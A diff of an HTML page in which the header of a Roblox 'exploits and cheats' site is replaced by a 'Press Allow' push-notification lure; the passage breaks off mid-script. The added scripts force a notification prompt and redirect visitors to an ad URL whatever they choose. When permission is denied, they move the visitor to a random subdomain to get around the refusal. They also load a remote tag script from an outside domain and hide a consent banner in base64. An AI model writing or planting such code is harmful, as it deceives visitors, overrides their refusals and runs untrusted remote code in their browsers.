@@ -1,822 +1,227 @@
 
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, maximum-scale=1, user-scalable=0">
-<meta name="keywords" content="exploit, exploits, hack, hacks, cheats, developers, social, media, best, library, source, wearedevs" />
-<meta name="description" content="Best website for Roblox exploits, a developers community, and more from WeAreDevs." />
-<title>Roblox Exploits & Hacks & Cheats - WeAreDevs</title>
-<script src="/cdn-cgi/apps/head/dM3ipLu7q0SolgbDApkhduCYXKU.js"></script><link rel="shortcut icon" href="/favicon.ico" />
-<link href="/css/main.css?v=19" rel="stylesheet" type="text/css">
-<link href="/css/themes/night.css?v=19" rel="stylesheet" type="text/css">
-<link href="/css/navheader.css?v=19" rel="stylesheet" type="text/css">
-<script type="text/javascript" src="/js/timestamp.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="google" content="notranslate">
+<script type="text/javascript">
+(function (l) {
+  var url = l.pathname + l.search + '&mprtr=1';
+  window.addEventListener('DOMContentLoaded', function () {
+    try {
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', url, true);
+      xhr.send();
+    } catch (e) {
+      console.error('Impression Logger Partial Error:');
+      console.error(e);
+    }
+  });
+})(window.location);
+</script>
 <script>
-    function getCookie(cname) {
-        var name = cname + "=";
-        var decodedCookie = decodeURIComponent(document.cookie);
-        var ca = decodedCookie.split(';');
-        for(var i = 0; i <ca.length; i++) {
-            var c = ca[i];
-            while (c.charAt(0) == ' ') {
-            c = c.substring(1);
+    (function () {
+      var tbUrl = '/4/5257004/?rhd=1&var=5197912&var3=598766190508405127';
+      var tbADUrl = '/4/5257004/?rhd=1&var=5197912&var3=598766190508405127';
+
+      function redirect(rsn, url) {
+          if ('0' == 1) console.log('>>> function redirect() -> url=' + url + ' debug=0 reason=' + rsn);
+          if ('0' == 0) {
+              setTimeout(function () {
+                  window.onbeforeunload = null;
+                  window.location.replace(url);
+              }, 500);
+          }
+      }
+      if ("Notification" in window) {
+        switch (Notification.permission) {
+          case "granted":
+            redirect("alreadysubscribed", tbUrl);
+            break;
+          case "denied":
+            redirect("deny", tbADUrl);
+            break;
+        }
+        var nInterval = setInterval(function () {
+          if (Notification.permission != "default") clearInterval(nInterval);
+          if (Notification.permission == "denied") {
+            redirect("deny", tbADUrl);
+          }
+        }, 50);
+      } else {
+        redirect("cantsubscribe", tbUrl);
+      }
+    })();
+  </script>
+<script>
+  (function(){function o(o){if(document.readyState!="loading"){o()}else{document.addEventListener("DOMContentLoaded",o)}}var e=document.createElement("style");e.innerHTML=".pn{position:fixed;bottom:0;left:0;right:0;background-color:rgba(0,0,0,0.8);padding:20px 40px;color:#ccc;line-height:1.4;font-size:12px;font-family:Roboto,Arial,Helvetica,sans-serif;animation:slideUp .5s ease 1 forwards}@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}.pn-wrap{max-width:960px;margin:0 auto}.pn-wrap a{color:#fff}.pn .pn-wrap .close-button{float:right;width:30px;height:30px;cursor:pointer;text-align:center;margin-top:-10px;font-size:25px;display:flex;justify-content:center;align-items:center;border-radius:100%}.pn .pn-wrap .close-button:hover{background-color:rgba(255,255,255,0.1)}";document.head.append(e);var t=document.createElement("div");t.innerHTML='<div class="pn"><div class="pn-wrap"><div class="close-button" onclick="document.querySelector(\'.pn\').remove()">&times;</div>'+window.atob("QnkgY2xpY2tpbmcgYEFsbG93YCBidXR0b24sIHlvdSBjb25zZW50IHRvIHJlY2VpdmUgbm90aWZpY2F0aW9ucyEgVGhlIG5vdGlmaWNhdGlvbnMgcHJvdmlkZSBuZXdzIGFuZCBhZHZlcnRpc2luZyBtYXRlcmlhbHMhIElmIHlvdSBkbyBub3QgYWdyZWUgdG8gcmVjZWl2ZSB0aGVzZSBub3RpZmljYXRpb25zLCBwbGVhc2UgdmlzaXQgb3VyIDxhIGhyZWY9Ii8iIHRhcmdldD0iX2JsYW5rIj5vcHQtb3V0IHBhZ2U8L2E+IQ==")+'</div></div>';o(function(){document.body.append(t.firstChild)})})();
+</script>
+<script>
+    if ('Notification' in window) {
+      var alphabet = 'abcdefghijklmnopqrstuvwxyz',
+          subdomain = window.location.host.split('.')[0];
+      function randomInt(min, max) {
+        return Math.floor(Math.random() * ((+max || 0) + 1 - (+min || 0)) + (+min || 0));
+      }
+      if (Notification.permission === 'denied' && alphabet.indexOf(subdomain) === -1) {
+        window.location.host = `${alphabet[randomInt(0,alphabet.length - 1)]}.${window.location.host}`;
+      }
+    }
+  </script>
+<script>try {Notification.requestPermission()} catch(e) {}</script>
+<script>
+    var mtPushZone = '5257005';
+    var mtS = '598766190508405127';
+    var mtZ = '5197912';
+    var mtTargetUrl = '/4/5257004/?rhd=1&var=5197912&var3=598766190508405127';
+    var mtDebug = '0';
+    var mtRDC = '1'; 
+    var mtUHD = '0'; 
+
+    var srcDomain = 'yonhelioliskor.com';
+    if (mtUHD == 1) {
+      srcDomain = window.location.hostname;
+    }
+
+    function redirect () {
+      if (mtDebug == 0 && mtTargetUrl != 0) {
+        setTimeout(() => {
+          window.onbeforeunload = null;
+          window.location.replace(mtTargetUrl);
+        }, 500);
+      }
+    }
+
+    var mtScript = document.createElement('script');
+    mtScript.src = `https://${srcDomain}/pfe/current/micro.tag.min.js?z=${mtPushZone}&ymid=${mtS}&var=${mtZ}&sw=/sw-check-permissions/${mtPushZone}`;
+    if (mtUHD == 1) {
+      mtScript.src += '&uhd=1';
+    }
+    mtScript.onload = (result) => {
+      if (mtDebug == 1) { console.log('microtag onload'); }
+
+      switch (result) {
+        case 'onBeforePermissionPrompt':
+          if (mtDebug == 1) { console.log('tag onBeforePermissionPrompt'); }
+          break;
+        case 'onPermissionDefault':
+          if (mtDebug == 1) { console.log('tag onPermissionDefault'); }
+          if (!(navigator.userAgent.toLowerCase().indexOf('firefox') > -1) && mtRDC != 0) {
+            if (mtRDC < 2) {
+              window.onbeforeunload = null;
+              mtRDC++;
+              window.location.replace(updateURLParameter(window.location.href, 'rdc', mtRDC));
+            } else {
+              redirect();
             }
-            if (c.indexOf(name) == 0) {
-            return c.substring(name.length, c.length);
+          }
+          break;
+        case 'onPermissionAllowed':
+          if (mtDebug == 1) { console.log('tag onPermissionAllowed'); }
+          mtTargetUrl = '/4/5257004/?rhd=1&var=5197912&var3=598766190508405127';
+          redirect();
+          break;
+        case 'onPermissionDenied':
+          if (mtDebug == 1) { console.log('tag onPermissionDenied'); }
+          mtTargetUrl = '/4/5257004/?rhd=1&var=5197912&var3=598766190508405127';
+          redirect();
+          break;
+        case 'onAlreadySubscribed':
+          if (mtDebug == 1) { console.log('tag onAlreadySubscribed'); }
+          redirect();
+          break;
+        case 'onNotificationUnsupported':
+          if (mtDebug == 1) { console.log('tag onNotificationUnsupported'); }
+          redirect();
+          break;
+      }
+    };
+    document.head.appendChild(mtScript);
+
+    function updateURLParameter(url, param, paramVal) {
+      var newAdditionalURL = "";
+      var tempArray = url.split("?");
+      var baseURL = tempArray[0];
+      var additionalURL = tempArray[1];
+      var temp = "";
+      if (additionalURL) {
+        tempArray = additionalURL.split("&");
+        for (var i=0; i<tempArray.length; i++) {
+          if (tempArray[i].split('=')[0] != param) {
+            newAdditionalURL += temp + tempArray[i];
+            temp = "&";
+          }
+        }
+      }
+
+      var rows_txt = temp + "" + param + "=" + paramVal;
+      return baseURL + "?" + newAdditionalURL + rows_txt;
+    }
+  </script>
+<style type="text/css">
+        * {
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box
+        }
+
+        body,
+        div,
+        html {
+            margin: 0;
+            padding: 0
+        }
+
+        img {
+            vertical-align: top
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%
+        }
+
+        body {
+            position: relative;
+            font-family: -apple-system, Roboto, Helvetica Neue, Trebuchet MS, sans-serif;
+            font-size: 100%
+        }
+
+        .wrapper {
+            position: absolute;
+            display: block;
+            text-align: center;
+            left: 0;
+            right: 0;
+            bottom: 50%
+        }
+
+        @media only screen and (max-width: 600px) {
+            .wrapper {
+                bottom: 30%;
             }
         }
-        return "";
-    }
-
-    function setCookie(name,value,days) {
-		var expires = "";
-		if (days) {
-			var date = new Date();
-			date.setTime(date.getTime() + (days*24*60*60*1000));
-			expires = "; expires=" + date.toUTCString();
-		}
-		document.cookie = name + "=" + (value || "")  + expires + "; path=/";
-    }
-
-    //Removes the stupid cloudflare parameters
-    history.replaceState && history.replaceState(null, '', location.pathname + location.search.replace(/[\?&](__cf_chl_jschl_tk__|__cf_chl_captcha_tk__)=[^&]+/, '').replace(/^&/, '?') + location.hash);
-</script>
-<link href="/css/exploits.css?v=19" rel="stylesheet" type="text/css">
+    </style>
+<title>
+          Press Allow      </title>
 </head>
-<body class="container">
-<header id="navigationbar" class="border1-bottom">
-<span class="menu-toggle "></span>
-<a id="foologo" href="/home" title="WeAreDevs">WeAreDevs</a>
-<ul class="navItems">
-<li class='navItem'>
-<a href="/exploits" title="Featured releases page">Exploits</a>
-</li>
-<li class='navItem'>
-<a href="/scripts" title="Featured scripts page">Scripts</a>
-</li>
-<li class='navItem'>
-<a title="Speak with the community" href="/forum">Community</a>
-</li>
-<li class='navItem adTip'>
-<a title="WeAreDevs Blog" href="https://theomnidev.com" target="_blank">Blog</a>
-</li>
-<li class='navItem' style="margin-left: auto;"><a href="/login">Login</a></li>
-</ul>
+<body class="en ltr">
+<div class="wrapper">
+<div class="progressBar"><img src="data:image/gif;base64,R0lGODlh0AANAMQWAJ6entfX19LS0vf39/Pz88bGxsrKysLCwr6+vrKysu/v7+fn59vb287Ozt/f36amprq6uqqqquPj46Kiouvr65aWlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDIzRDcxMTg4QkU3MTFFN0EzNkY5MDNBOUI1NzY0RjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDIzRDcxMTk4QkU3MTFFN0EzNkY5MDNBOUI1NzY0RjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFQjlFOUQ3RjhCRTIxMUU3QTM2RjkwM0E5QjU3NjRGNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFQjlFOUQ4MDhCRTIxMUU3QTM2RjkwM0E5QjU3NjRGNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6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"></div>
+<div class="text">Click the <b>«Allow»</b> button to subscribe to the push notifications and continue watching</div>
+</div>
 <script>
-        //Used to send logout request to API
-		function logout(){
-            if(!confirm("You are about to logout")) return
+            var clickTbUrl = "/4/5257004/?rhd=1&var=5197912&var3=598766190508405127";
 
-            fetch('/api/v1/account/logout', {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-            })
-            .then(res => res.json())
-            .then(res => {
-                if(res.success) window.location.reload()
-                else {
-                    if(res.reason) alert("Error: " + res.reason)
-                    else alert("An unexpected error occured...")
-                }
-            })
-            .catch(()=>alert("Failed to contact the server or an unexpected response was received..."))
-        }
-
-        function DeleteNotifications(id){
-            return fetch('/api/v1/notifications', {
-                method: "DELETE",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    id
-                })
-            })
-        }
-        
-        function DeleteAllNotifs(el){
-            //The server will default to delete everything because there is no specified id
-            DeleteNotifications()
